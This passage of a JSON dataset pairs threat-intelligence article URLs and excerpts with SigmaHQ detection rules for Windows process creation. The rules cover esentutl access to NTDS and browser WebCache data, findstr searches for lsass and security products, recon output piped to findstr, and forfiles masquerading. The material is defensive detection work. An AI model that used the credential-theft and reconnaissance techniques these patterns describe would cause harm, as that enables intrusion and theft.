          "CommandLine|contains|all": [
            "esentutl",
            " /p"
          ]
        },
        "condition": "selection"
      },
      "fields": [
        "User",
        "CommandLine",
        "ParentCommandLine",
        "CurrentDirectory"
      ],
      "falsepositives": [
        "To be determined"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_esentutl_params.yml"
  },
  "162": {
    "url": "https://attack.mitre.org/software/S0404/",
    "markdown": "# esentutl esentutl is a command-line tool that provides database utilities for the Windows Extensible Storage Engine.[1] ## ID: S0404 ### Associated Software: esentutl.exe ### Type: TOOL ### Platforms: Windows ### Contributors: Edward Millington; Matthew Demaske, Adaptforward ### Version: 1.3 ### Created: 03 September 2019 ### Last Modified: 28 September 2023 ## Techniques Used | Domain | ID | Name | Use | | ---------- | --------- | ------------------------------------ | ---------------------------------------------------------------------------------------------- | | Enterprise | T1005 | Data from Local System | esentutl can be used to collect data from local file systems.[2] | | Enterprise | T1006 | Direct",
    "sigma_rule": {
      "title": "Esentutl Gather Credentials",
      "id": "7df1713a-1a5b-4a4b-a071-dc83b144a101",
      "status": "test",
      "description": "Conti recommendation to its affiliates to use esentutl to access NTDS dumped file. Trickbot also uses this utilities to get MSEdge info via its module pwgrab.",
      "references": [
        "https://twitter.com/vxunderground/status/1423336151860002816",
        "https://attack.mitre.org/software/S0404/",
        "https://thedfirreport.com/2021/08/01/bazarcall-to-conti-ransomware-via-trickbot-and-cobalt-strike/"
      ],
      "author": "sam0x90",
      "date": "2021-08-06",
      "modified": "2022-10-09",
      "tags": [
        "attack.credential-access",
        "attack.t1003",
        "attack.t1003.003"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "CommandLine|contains|all": [
            "esentutl",
            " /p"
          ]
        },
        "condition": "selection"
      },
      "fields": [
        "User",
        "CommandLine",
        "ParentCommandLine",
        "CurrentDirectory"
      ],
      "falsepositives": [
        "To be determined"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_esentutl_params.yml"
  },
  "163": {
    "url": "https://thedfirreport.com/2021/08/01/bazarcall-to-conti-ransomware-via-trickbot-and-cobalt-strike/",
    "markdown": "# BazarCall to Conti Ransomware via Trickbot and Cobalt Strike **Categories:** adfind BazarCall cobaltstrike conti ransomware trickbot **Published on:** August 1, 2021 ## Intro This report will go through an intrusion that went from an Excel file to domain-wide ransomware. The threat actors used BazarCall to install Trickbot in the environment, which downloaded and executed a Cobalt Strike Beacon. From there, the threat actor discovered the internal network before moving laterally to a domain controller for additional discovery. A couple of days later, the threat actors came back and executed Conti ransomware across the domain. Unfamiliar with BazaCall/BazarCall? Read more",
    "sigma_rule": {
      "title": "Esentutl Gather Credentials",
      "id": "7df1713a-1a5b-4a4b-a071-dc83b144a101",
      "status": "test",
      "description": "Conti recommendation to its affiliates to use esentutl to access NTDS dumped file. Trickbot also uses this utilities to get MSEdge info via its module pwgrab.",
      "references": [
        "https://twitter.com/vxunderground/status/1423336151860002816",
        "https://attack.mitre.org/software/S0404/",
        "https://thedfirreport.com/2021/08/01/bazarcall-to-conti-ransomware-via-trickbot-and-cobalt-strike/"
      ],
      "author": "sam0x90",
      "date": "2021-08-06",
      "modified": "2022-10-09",
      "tags": [
        "attack.credential-access",
        "attack.t1003",
        "attack.t1003.003"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "CommandLine|contains|all": [
            "esentutl",
            " /p"
          ]
        },
        "condition": "selection"
      },
      "fields": [
        "User",
        "CommandLine",
        "ParentCommandLine",
        "CurrentDirectory"
      ],
      "falsepositives": [
        "To be determined"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_esentutl_params.yml"
  },
  "164": {
    "url": "https://thedfirreport.com/2022/02/07/qbot-likes-to-move-it-move-it/",
    "markdown": "# Qbot Likes to Move It, Move It **Category:** Qbot **Published on:** February 7, 2022 ## Introduction Qbot (aka QakBot, Quakbot, Pinkslipbot) has been around for a long time, having first been observed back in 2007. More info on Qbot can be found at the following links: Microsoft & Red Canary. In this case, from October 2021, we will break down how Qbot quickly spread across all workstations in an environment, while stealing browser information and emails. While the case is nearly 5 months old, Qbot infections in the past week have followed the same pattern. ## Case Summary We",
    "sigma_rule": {
      "title": "Esentutl Steals Browser Information",
      "id": "6a69f62d-ce75-4b57-8dce-6351eb55b362",
      "status": "test",
      "description": "One way Qbot steals sensitive information is by extracting browser data from Internet Explorer and Microsoft Edge by using the built-in utility esentutl.exe",
      "references": [
        "https://thedfirreport.com/2022/02/07/qbot-likes-to-move-it-move-it/",
        "https://redcanary.com/threat-detection-report/threats/qbot/",
        "https://thedfirreport.com/2022/10/31/follina-exploit-leads-to-domain-compromise/"
      ],
      "author": "frack113",
      "date": "2022-02-13",
      "modified": "2024-03-05",
      "tags": [
        "attack.collection",
        "attack.t1005"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\esentutl.exe"
          },
          {
            "OriginalFileName": "esentutl.exe"
          }
        ],
        "selection_flag": {
          "CommandLine|contains|windash": "-r"
        },
        "selection_webcache": {
          "CommandLine|contains": "\\Windows\\WebCache"
        },
        "condition": "all of selection*"
      },
      "falsepositives": [
        "Legitimate use"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_esentutl_webcache.yml"
  },
  "165": {
    "url": "https://redcanary.com/threat-detection-report/threats/qbot/",
    "markdown": "# Qbot After a government takedown in August, Qbot affiliates resumed activity in late 2023 after adopting new malware and infrastructure. ## OVERALL RANK **#8** ## CUSTOMERS AFFECTED **2.9%** --- ## Threat Sounds <iframe allowfullscreen=\"allowfullscreen\" frameborder=\"0\" src=\"https://open.spotify.com/embed/track/0boXJ9srSz8k62oWedG8fK?utm_source=generator\" style=\"border-radius: 12px;\"></iframe> Last summer’s much-hyped Qbot takedown appeared to only last for a few weeks. Do you have to let it linger, Qbot affiliates? Do you have to? --- ## Analysis Also known as “Qakbot,” the Qbot banking trojan has been active since at least 2007. Initially focused on stealing user data and banking credentials, Qbot’s functionality has expanded to incorporate features such",
    "sigma_rule": {
      "title": "Esentutl Steals Browser Information",
      "id": "6a69f62d-ce75-4b57-8dce-6351eb55b362",
      "status": "test",
      "description": "One way Qbot steals sensitive information is by extracting browser data from Internet Explorer and Microsoft Edge by using the built-in utility esentutl.exe",
      "references": [
        "https://thedfirreport.com/2022/02/07/qbot-likes-to-move-it-move-it/",
        "https://redcanary.com/threat-detection-report/threats/qbot/",
        "https://thedfirreport.com/2022/10/31/follina-exploit-leads-to-domain-compromise/"
      ],
      "author": "frack113",
      "date": "2022-02-13",
      "modified": "2024-03-05",
      "tags": [
        "attack.collection",
        "attack.t1005"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\esentutl.exe"
          },
          {
            "OriginalFileName": "esentutl.exe"
          }
        ],
        "selection_flag": {
          "CommandLine|contains|windash": "-r"
        },
        "selection_webcache": {
          "CommandLine|contains": "\\Windows\\WebCache"
        },
        "condition": "all of selection*"
      },
      "falsepositives": [
        "Legitimate use"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_esentutl_webcache.yml"
  },
  "166": {
    "url": "https://thedfirreport.com/2022/10/31/follina-exploit-leads-to-domain-compromise/",
    "markdown": "# Follina Exploit Leads to Domain Compromise **Categories:** adfind cobaltstrike Qbot **Published on:** October 31, 2022 --- In early June 2022, we observed an intrusion where a threat actor gained initial access by exploiting the CVE-2022-30190 (Follina) vulnerability, which triggered a Qbot infection chain. Qbot, also known as Qakbot or Pinksliplot, is actively developed and capable of a number of functions from reconnaissance, lateral movement, data exfiltration, to delivering other payloads acting as an initial access broker. Qbot is regarded by US CERT as being one of the 2021 Top Malware Strains in Alert (AA22-216A). In the past, we’ve covered",
    "sigma_rule": {
      "title": "Esentutl Steals Browser Information",
      "id": "6a69f62d-ce75-4b57-8dce-6351eb55b362",
      "status": "test",
      "description": "One way Qbot steals sensitive information is by extracting browser data from Internet Explorer and Microsoft Edge by using the built-in utility esentutl.exe",
      "references": [
        "https://thedfirreport.com/2022/02/07/qbot-likes-to-move-it-move-it/",
        "https://redcanary.com/threat-detection-report/threats/qbot/",
        "https://thedfirreport.com/2022/10/31/follina-exploit-leads-to-domain-compromise/"
      ],
      "author": "frack113",
      "date": "2022-02-13",
      "modified": "2024-03-05",
      "tags": [
        "attack.collection",
        "attack.t1005"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\esentutl.exe"
          },
          {
            "OriginalFileName": "esentutl.exe"
          }
        ],
        "selection_flag": {
          "CommandLine|contains|windash": "-r"
        },
        "selection_webcache": {
          "CommandLine|contains": "\\Windows\\WebCache"
        },
        "condition": "all of selection*"
      },
      "falsepositives": [
        "Legitimate use"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_esentutl_webcache.yml"
  },
  "167": {
    "url": "https://www.bleepingcomputer.com/news/security/hhsgov-open-redirect-used-by-coronavirus-phishing-to-spread-malware/",
    "markdown": "# HHS.gov Open Redirect Used by Coronavirus Phishing to Spread Malware March 23, 2020 An HHS.gov open redirect is currently being used by attackers to push malware payloads onto unsuspecting victims' systems with the help of coronavirus-themed phishing emails. Open redirects are web addresses that automatically redirect users between a source website and a target site, and are regularly used by malicious actors to send their targets to phishing landing pages or to deliver malware payloads under the guise of legitimate services. HHS.gov is the website of the U.S. Department of Health & Human Services which makes this specific open",
    "sigma_rule": {
      "title": "Findstr Launching .lnk File",
      "id": "33339be3-148b-4e16-af56-ad16ec6c7e7b",
      "status": "test",
      "description": "Detects usage of findstr to identify and execute a lnk file as seen within the HHS redirect attack",
      "references": [
        "https://www.bleepingcomputer.com/news/security/hhsgov-open-redirect-used-by-coronavirus-phishing-to-spread-malware/"
      ],
      "author": "Trent Liffick",
      "date": "2020-05-01",
      "modified": "2024-01-15",
      "tags": [
        "attack.defense-evasion",
        "attack.t1036",
        "attack.t1202",
        "attack.t1027.003"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": [
              "\\find.exe",
              "\\findstr.exe"
            ]
          },
          {
            "OriginalFileName": [
              "FIND.EXE",
              "FINDSTR.EXE"
            ]
          }
        ],
        "selection_cli": {
          "CommandLine|endswith": [
            ".lnk",
            ".lnk\"",
            ".lnk'"
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_findstr_lnk.yml"
  },
  "168": {
    "url": "https://blog.talosintelligence.com/recent-cyber-attack",
    "markdown": "# Cisco Talos shares insights related to recent cyber attack on Cisco _By Nick Biasini_ **Wednesday, August 10, 2022 15:30** **Category:** Headlines --- ### THIS POST IS ALSO AVAILABLE IN: 日本語 (Japanese) --- ## Update History | Date | Description of Updates | |------------------|----------------------------------------------------------------------------------------| | Aug. 10th 2022 | Adding clarifying details on activity involving active directory. | | Aug. 10th 2022 | Update made to the Cisco Response and Recommendations section related to MFA. | --- ## Executive summary - On May 24, 2022, Cisco became aware of a potential compromise. Since that point, Cisco Security Incident Response (CSIRT)",
    "sigma_rule": {
      "title": "LSASS Process Reconnaissance Via Findstr.EXE",
      "id": "fe63010f-8823-4864-a96b-a7b4a0f7b929",
      "status": "test",
      "description": "Detects findstring commands that include the keyword lsass, which indicates recon actviity for the LSASS process PID",
      "references": [
        "https://blog.talosintelligence.com/recent-cyber-attack"
      ],
      "author": "Florian Roth (Nextron Systems)",
      "date": "2022-08-12",
      "modified": "2024-06-04",
      "tags": [
        "attack.credential-access",
        "attack.t1552.006"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_findstr_img": [
          {
            "Image|endswith": [
              "\\find.exe",
              "\\findstr.exe"
            ]
          },
          {
            "OriginalFileName": [
              "FIND.EXE",
              "FINDSTR.EXE"
            ]
          }
        ],
        "selection_findstr_cli": {
          "CommandLine|contains": "lsass"
        },
        "selection_special": {
          "CommandLine|contains|windash": [
            " /i \"lsass",
            " /i lsass.exe",
            "findstr \"lsass",
            "findstr lsass",
            "findstr.exe \"lsass",
            "findstr.exe lsass"
          ]
        },
        "condition": "all of selection_findstr_* or selection_special"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_findstr_lsass.yml"
  },
  "169": {
    "url": "https://github.com/redcanaryco/atomic-red-team/blob/02cb591f75064ffe1e0df9ac3ed5972a2e491c97/atomics/T1057/T1057.md#atomic-test-6---discover-specific-process---tasklist",
    "markdown": "",
    "sigma_rule": {
      "title": "Recon Command Output Piped To Findstr.EXE",
      "id": "ccb5742c-c248-4982-8c5c-5571b9275ad3",
      "related": [
        {
          "id": "fe63010f-8823-4864-a96b-a7b4a0f7b929",
          "type": "derived"
        }
      ],
      "status": "experimental",
      "description": "Detects the execution of a potential recon command where the results are piped to \"findstr\". This is meant to trigger on inline calls of \"cmd.exe\" via the \"/c\" or \"/k\" for example.\nAttackers often time use this technique to extract specific information they require in their reconnaissance phase.\n",
      "references": [
        "https://github.com/redcanaryco/atomic-red-team/blob/02cb591f75064ffe1e0df9ac3ed5972a2e491c97/atomics/T1057/T1057.md#atomic-test-6---discover-specific-process---tasklist",
        "https://www.hhs.gov/sites/default/files/manage-engine-vulnerability-sector-alert-tlpclear.pdf",
        "https://www.trendmicro.com/en_us/research/22/d/spring4shell-exploited-to-deploy-cryptocurrency-miners.html"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems), frack113",
      "date": "2023-07-06",
      "modified": "2024-06-27",
      "tags": [
        "attack.discovery",
        "attack.t1057"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "CommandLine|contains": [
            "ipconfig*|*find",
            "net*|*find",
            "netstat*|*find",
            "ping*|*find",
            "systeminfo*|*find",
            "tasklist*|*find",
            "whoami*|*find"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_findstr_recon_pipe_output.yml"
  },
  "170": {
    "url": "https://www.hhs.gov/sites/default/files/manage-engine-vulnerability-sector-alert-tlpclear.pdf",
    "markdown": "",
    "sigma_rule": {
      "title": "Recon Command Output Piped To Findstr.EXE",
      "id": "ccb5742c-c248-4982-8c5c-5571b9275ad3",
      "related": [
        {
          "id": "fe63010f-8823-4864-a96b-a7b4a0f7b929",
          "type": "derived"
        }
      ],
      "status": "experimental",
      "description": "Detects the execution of a potential recon command where the results are piped to \"findstr\". This is meant to trigger on inline calls of \"cmd.exe\" via the \"/c\" or \"/k\" for example.\nAttackers often time use this technique to extract specific information they require in their reconnaissance phase.\n",
      "references": [
        "https://github.com/redcanaryco/atomic-red-team/blob/02cb591f75064ffe1e0df9ac3ed5972a2e491c97/atomics/T1057/T1057.md#atomic-test-6---discover-specific-process---tasklist",
        "https://www.hhs.gov/sites/default/files/manage-engine-vulnerability-sector-alert-tlpclear.pdf",
        "https://www.trendmicro.com/en_us/research/22/d/spring4shell-exploited-to-deploy-cryptocurrency-miners.html"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems), frack113",
      "date": "2023-07-06",
      "modified": "2024-06-27",
      "tags": [
        "attack.discovery",
        "attack.t1057"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "CommandLine|contains": [
            "ipconfig*|*find",
            "net*|*find",
            "netstat*|*find",
            "ping*|*find",
            "systeminfo*|*find",
            "tasklist*|*find",
            "whoami*|*find"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_findstr_recon_pipe_output.yml"
  },
  "171": {
    "url": "https://www.trendmicro.com/en_us/research/22/d/spring4shell-exploited-to-deploy-cryptocurrency-miners.html",
    "markdown": "",
    "sigma_rule": {
      "title": "Recon Command Output Piped To Findstr.EXE",
      "id": "ccb5742c-c248-4982-8c5c-5571b9275ad3",
      "related": [
        {
          "id": "fe63010f-8823-4864-a96b-a7b4a0f7b929",
          "type": "derived"
        }
      ],
      "status": "experimental",
      "description": "Detects the execution of a potential recon command where the results are piped to \"findstr\". This is meant to trigger on inline calls of \"cmd.exe\" via the \"/c\" or \"/k\" for example.\nAttackers often time use this technique to extract specific information they require in their reconnaissance phase.\n",
      "references": [
        "https://github.com/redcanaryco/atomic-red-team/blob/02cb591f75064ffe1e0df9ac3ed5972a2e491c97/atomics/T1057/T1057.md#atomic-test-6---discover-specific-process---tasklist",
        "https://www.hhs.gov/sites/default/files/manage-engine-vulnerability-sector-alert-tlpclear.pdf",
        "https://www.trendmicro.com/en_us/research/22/d/spring4shell-exploited-to-deploy-cryptocurrency-miners.html"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems), frack113",
      "date": "2023-07-06",
      "modified": "2024-06-27",
      "tags": [
        "attack.discovery",
        "attack.t1057"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "CommandLine|contains": [
            "ipconfig*|*find",
            "net*|*find",
            "netstat*|*find",
            "ping*|*find",
            "systeminfo*|*find",
            "tasklist*|*find",
            "whoami*|*find"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_findstr_recon_pipe_output.yml"
  },
  "172": {
    "url": "https://github.com/redcanaryco/atomic-red-team/blob/987e3ca988ae3cff4b9f6e388c139c05bf44bbb8/atomics/T1518.001/T1518.001.md#atomic-test-1---security-software-discovery",
    "markdown": "",
    "sigma_rule": {
      "title": "Security Tools Keyword Lookup Via Findstr.EXE",
      "id": "4fe074b4-b833-4081-8f24-7dcfeca72b42",
      "related": [
        {
          "id": "fe63010f-8823-4864-a96b-a7b4a0f7b929",
          "type": "derived"
        }
      ],
      "status": "test",
      "description": "Detects execution of \"findstr\" to search for common names of security tools. Attackers often pipe the results of recon commands such as \"tasklist\" or \"whoami\" to \"findstr\" in order to filter out the results.\nThis detection focuses on the keywords that the attacker might use as a filter.\n",
      "references": [
        "https://github.com/redcanaryco/atomic-red-team/blob/987e3ca988ae3cff4b9f6e388c139c05bf44bbb8/atomics/T1518.001/T1518.001.md#atomic-test-1---security-software-discovery",
        "https://www.microsoft.com/en-us/security/blog/2023/10/18/multiple-north-korean-threat-actors-exploiting-the-teamcity-cve-2023-42793-vulnerability/",
        "https://www.hhs.gov/sites/default/files/manage-engine-vulnerability-sector-alert-tlpclear.pdf"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems), frack113",
      "date": "2023-10-20",
      "modified": "2023-11-14",
      "tags": [
        "attack.discovery",
        "attack.t1518.001"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": [
              "\\find.exe",
              "\\findstr.exe"
            ]
          },
          {
            "OriginalFileName": [
              "FIND.EXE",
              "FINDSTR.EXE"
            ]
          }
        ],
        "selection_cli": {
          "CommandLine|endswith": [
            " avira",
            " avira\"",
            " cb",
            " cb\"",
            " cylance",
            " cylance\"",
            " defender",
            " defender\"",
            " kaspersky",
            " kaspersky\"",
            " kes",
            " kes\"",
            " mc",
            " mc\"",
            " sec",
            " sec\"",
            " sentinel",
            " sentinel\"",
            " symantec",
            " symantec\"",
            " virus",
            " virus\""
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_findstr_security_keyword_lookup.yml"
  },
  "173": {
    "url": "https://www.microsoft.com/en-us/security/blog/2023/10/18/multiple-north-korean-threat-actors-exploiting-the-teamcity-cve-2023-42793-vulnerability/",
    "markdown": "",
    "sigma_rule": {
      "title": "Security Tools Keyword Lookup Via Findstr.EXE",
      "id": "4fe074b4-b833-4081-8f24-7dcfeca72b42",
      "related": [
        {
          "id": "fe63010f-8823-4864-a96b-a7b4a0f7b929",
          "type": "derived"
        }
      ],
      "status": "test",
      "description": "Detects execution of \"findstr\" to search for common names of security tools. Attackers often pipe the results of recon commands such as \"tasklist\" or \"whoami\" to \"findstr\" in order to filter out the results.\nThis detection focuses on the keywords that the attacker might use as a filter.\n",
      "references": [
        "https://github.com/redcanaryco/atomic-red-team/blob/987e3ca988ae3cff4b9f6e388c139c05bf44bbb8/atomics/T1518.001/T1518.001.md#atomic-test-1---security-software-discovery",
        "https://www.microsoft.com/en-us/security/blog/2023/10/18/multiple-north-korean-threat-actors-exploiting-the-teamcity-cve-2023-42793-vulnerability/",
        "https://www.hhs.gov/sites/default/files/manage-engine-vulnerability-sector-alert-tlpclear.pdf"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems), frack113",
      "date": "2023-10-20",
      "modified": "2023-11-14",
      "tags": [
        "attack.discovery",
        "attack.t1518.001"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": [
              "\\find.exe",
              "\\findstr.exe"
            ]
          },
          {
            "OriginalFileName": [
              "FIND.EXE",
              "FINDSTR.EXE"
            ]
          }
        ],
        "selection_cli": {
          "CommandLine|endswith": [
            " avira",
            " avira\"",
            " cb",
            " cb\"",
            " cylance",
            " cylance\"",
            " defender",
            " defender\"",
            " kaspersky",
            " kaspersky\"",
            " kes",
            " kes\"",
            " mc",
            " mc\"",
            " sec",
            " sec\"",
            " sentinel",
            " sentinel\"",
            " symantec",
            " symantec\"",
            " virus",
            " virus\""
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_findstr_security_keyword_lookup.yml"
  },
  "174": {
    "url": "https://www.hhs.gov/sites/default/files/manage-engine-vulnerability-sector-alert-tlpclear.pdf",
    "markdown": "",
    "sigma_rule": {
      "title": "Security Tools Keyword Lookup Via Findstr.EXE",
      "id": "4fe074b4-b833-4081-8f24-7dcfeca72b42",
      "related": [
        {
          "id": "fe63010f-8823-4864-a96b-a7b4a0f7b929",
          "type": "derived"
        }
      ],
      "status": "test",
      "description": "Detects execution of \"findstr\" to search for common names of security tools. Attackers often pipe the results of recon commands such as \"tasklist\" or \"whoami\" to \"findstr\" in order to filter out the results.\nThis detection focuses on the keywords that the attacker might use as a filter.\n",
      "references": [
        "https://github.com/redcanaryco/atomic-red-team/blob/987e3ca988ae3cff4b9f6e388c139c05bf44bbb8/atomics/T1518.001/T1518.001.md#atomic-test-1---security-software-discovery",
        "https://www.microsoft.com/en-us/security/blog/2023/10/18/multiple-north-korean-threat-actors-exploiting-the-teamcity-cve-2023-42793-vulnerability/",
        "https://www.hhs.gov/sites/default/files/manage-engine-vulnerability-sector-alert-tlpclear.pdf"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems), frack113",
      "date": "2023-10-20",
      "modified": "2023-11-14",
      "tags": [
        "attack.discovery",
        "attack.t1518.001"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": [
              "\\find.exe",
              "\\findstr.exe"
            ]
          },
          {
            "OriginalFileName": [
              "FIND.EXE",
              "FINDSTR.EXE"
            ]
          }
        ],
        "selection_cli": {
          "CommandLine|endswith": [
            " avira",
            " avira\"",
            " cb",
            " cb\"",
            " cylance",
            " cylance\"",
            " defender",
            " defender\"",
            " kaspersky",
            " kaspersky\"",
            " kes",
            " kes\"",
            " mc",
            " mc\"",
            " sec",
            " sec\"",
            " sentinel",
            " sentinel\"",
            " symantec",
            " symantec\"",
            " virus",
            " virus\""
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_findstr_security_keyword_lookup.yml"
  },
  "175": {
    "url": "https://www.hexacorn.com/blog/2023/12/31/1-little-known-secret-of-forfiles-exe/",
    "markdown": "# 1 little known secret of forfiles.exe Posted on 2023-12-31 The *forfiles.exe* program is a well-known lolbin. Its power comes from the */c* command line argument that helps to specify a command that we want to execute for each item found by the program when it enumerates directories. The less known fact about *forfiles.exe* is that executing the program itself, without any option, leads to *cmd.exe* being spawn for every item enumerated. This is because its default command is *cmd /c echo @file*. As such, one can copy *forfiles.exe* to a different directory, and place malicious *cmd.exe* there. Running *forfiles.exe*",
    "sigma_rule": {
      "title": "Forfiles.EXE Child Process Masquerading",
      "id": "f53714ec-5077-420e-ad20-907ff9bb2958",
      "status": "test",
      "description": "Detects the execution of \"forfiles\" from a non-default location, in order to potentially spawn a custom \"cmd.exe\" from the current working directory.\n",
      "references": [
        "https://www.hexacorn.com/blog/2023/12/31/1-little-known-secret-of-forfiles-exe/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems), Anish Bogati",
      "date": "2024-01-05",
      "tags": [
        "attack.defense-evasion",
        "attack.t1036"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "ParentCommandLine|endswith": [
            ".exe",
            ".exe\""
          ],
          "Image|endswith": "\\cmd.exe",
          "CommandLine|startswith": "/c echo \""
        },
        "filter_main_parent_not_sys": {
          "ParentImage|contains": [
            ":\\Windows\\System32\\",
            ":\\Windows\\SysWOW64\\"
          ],
          "ParentImage|endswith": "\\forfiles.exe",
          "Image|contains": [
            ":\\Windows\\System32\\",
            ":\\Windows\\SysWOW64\\"
          ],
          "Image|endswith": "\\cmd.exe"
        },
        "condition": "selection and not 1 of filter_main_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_forfiles_child_process_masquerading.yml"
  },
  "176": {
    "url": "https://blogs.vmware.com/security/2022/11/batloader-the-evasive-downloader-malware.html",
    "markdown": "# BATLOADER: The Evasive Downloader Malware **Category:** Threat Intelligence **Date:** November 14, 2022 ## Executive Summary VMware Carbon Black Managed Detection and Response (MDR) analysts are constantly handling security incidents within our customer environments and tracking emerging and persistent malware campaigns. One such threat that has been particularly prevalent over the last couple of months is BatLoader. Named by Mandiant [1], BatLoader is an initial access malware that heavily uses batch and PowerShell scripts to gain a foothold on a victim machine and deliver other malware. The threat actors utilize search engine optimization (SEO) poisoning to lure users to download",
    "sigma_rule": {
      "title": "File Decryption Using Gpg4win",
      "id": "037dcd71-33a8-4392-bb01-293c94663e5a",
      "status": "test",
      "description": "Detects usage of Gpg4win to decrypt files",
      "references": [
        "https://blogs.vmware.com/security/2022/11/batloader-the-evasive-downloader-malware.html",
        "https://www.gpg4win.de/documentation.html",
        "https://news.sophos.com/en-us/2022/01/19/zloader-installs-remote-access-backdoors-and-delivers-cobalt-strike/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-08-09",
      "tags": [
        "attack.execution"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_metadata": [
          {
            "Image|endswith": [
              "\\gpg.exe",
              "\\gpg2.exe"
            ]
          },
          {
            "Description": "GnuPG’s OpenPGP tool"
          }
        ],
        "selection_cli": {
          "CommandLine|contains|all": [
            " -d ",
            "passphrase"
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_gpg4win_decryption.yml"
  },
  "177": {
    "url": "https://www.gpg4win.de/documentation.html",
    "markdown": "# Documentation The Gpg4win Compendium is an old style documentation to get into the world of cryptography. Using the example of Gpg4win, you learn step by step the secure use of Kleopatra, GpgEX and GpgOL. ## Gpg4win Compendium for Version 2 (old) The \"Gpg4win-Compendium\" is the end-user documentation for Gpg4win2. It combines the approximately 190 pages of the previously separate Gpg4win manuals \"Einsteiger\" and \"Durchblicker\". All chapters were reworked, extended, and updated for Gpg4win version 2. Among other enhancements, it covers Kleopatra, GpgEX and PGP/MIME, as well as S/MIME and X.509. Note: The English language version of the Gpg4win-Compendium is",
    "sigma_rule": {
      "title": "File Decryption Using Gpg4win",
      "id": "037dcd71-33a8-4392-bb01-293c94663e5a",
      "status": "test",
      "description": "Detects usage of Gpg4win to decrypt files",
      "references": [
        "https://blogs.vmware.com/security/2022/11/batloader-the-evasive-downloader-malware.html",
        "https://www.gpg4win.de/documentation.html",
        "https://news.sophos.com/en-us/2022/01/19/zloader-installs-remote-access-backdoors-and-delivers-cobalt-strike/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-08-09",
      "tags": [
        "attack.execution"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
